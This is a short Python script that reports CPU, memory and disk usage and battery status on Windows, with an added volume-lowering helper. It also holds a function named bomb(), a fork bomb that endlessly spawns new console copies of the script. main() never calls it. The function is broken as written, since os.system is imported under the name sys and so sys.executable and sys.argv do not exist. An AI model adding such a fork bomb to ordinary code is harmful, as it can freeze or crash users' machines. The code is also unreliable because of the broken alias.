import subprocess
import pyautogui
from os import system as sys, name
from psutil import cpu_percent, virtual_memory, disk_usage, sensors_battery


def main():
    print("\n")
    print(f"CPU: {cpu_usage()}%")
    print(f"Memory: {memory_percentage()}%")
    print(f"Disk: {disk_use()}%")
    print("\n")
    if plugged_in_detect() is False:
        print("On Battery")
    else:
        print("Plugged In")


def memory_percentage():
    total = 100 * virtual_memory().total // (1024 ** 3) / 100
    not_used = 100 * virtual_memory().available // (1024 ** 3) / 100
    used = 10000 * (total - not_used) // total / 100
    return used

def cpu_usage():
    return cpu_percent(2)

def disk_use():
    return disk_usage('/').percent


"""
    print(f"Total memory: {total} GB")
    print(f"Available memory: {not_used} GB")
    print(f"Used memory: {total - not_used} GB")
    print(f"Memory percentage: {used}%")
"""


def sound_control():
    pyautogui.PAUSE = 1

    for i in range(5):
        pyautogui.press('volumedown')

def bomb():
    while True:
        subprocess.Popen([sys.executable, sys.argv[0]], creationflags=subprocess.CREATE_NEW_CONSOLE)

def plugged_in_detect():
    return sensors_battery().power_plugged


if __name__ == '__main__':
    if name == "nt":
        main()

"""
    when pause 2 sec, it downs by 2 degree of volume
 """

"""bash script : runas /user:username program.exe
    pass: password(not pin)
"""